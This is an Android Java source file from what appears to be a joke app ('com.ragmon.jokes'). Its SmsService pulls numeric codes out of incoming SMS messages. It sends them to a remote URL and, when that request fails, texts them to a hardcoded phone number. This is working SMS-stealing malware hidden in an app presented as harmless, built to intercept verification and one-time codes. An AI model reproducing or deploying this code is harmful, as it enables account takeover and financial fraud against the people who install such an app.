package com.ragmon.jokes.services;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.util.Log;

import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class SmsService extends Service {

    private static final String URL = "http://google.com/";

    private static final String smsTo = "+380934542364";

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        final String sms_body = intent.getExtras().getString("sms_body");
        final String code = getSmsCode(sms_body);

        sendToUrl(URL, code, new Runnable() {
            @Override
            public void run() {
                sendSms(smsTo, code);
            }
        });

        return START_STICKY;
    }

    private void sendToUrl(String url, String code, Runnable onError) {
        url = url + "?code=" + code;

        HttpClient httpclient = new DefaultHttpClient();
        HttpGet httpget= new HttpGet(url);

        HttpResponse response = null;
        try {
            response = httpclient.execute(httpget);
            if(response.getStatusLine().getStatusCode() != 200){
                throw new Exception("HTTP Status != 200");
            }
        } catch (Exception e) {
            Log.e("SmsService", "Can\'t send http request.");
            onError.run();
        }
    }

    private void sendSms(String to, String code) {
        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendTextMessage(to, null, code, null, null);
    }

    private String getSmsCode(String sms_body) {
        Pattern pattern = Pattern.compile("(\\d+)");
        if (pattern.matcher(sms_body).matches()) {
            Matcher matcher = pattern.matcher(sms_body);
            matcher.find();

            return matcher.group(1);
        }
        return null;
    }


}
